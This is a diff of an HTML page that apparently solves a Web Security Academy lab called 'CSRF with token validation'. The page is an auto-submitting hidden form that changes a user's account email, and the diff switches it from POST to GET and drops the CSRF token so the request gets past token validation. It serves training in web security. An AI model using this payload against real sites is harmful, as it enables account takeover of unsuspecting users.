@@ -1,9 +1,8 @@
 <html>
     <body>
         <h1>CSRF with token validation</h1>
-        <form method="POST" id="csrf" action="https://0ad2000604a7903d80bd03690087000e.web-security-academy.net/my-account/change-email">
+        <form method="GET" id="csrf" action="https://0aa300c70478e608808730c000ac00d1.web-security-academy.net/my-account/change-email">
             <input type="hidden" name="email" value="csrf.token.validation@gmail.com" />
-            <input type="hidden" name="csrf" value=""Cd0FCpzQf2psecvQpOiWlK5zNCOJ3mQ9 />
         </form>
         <script>
             document.getElementById("csrf").submit();
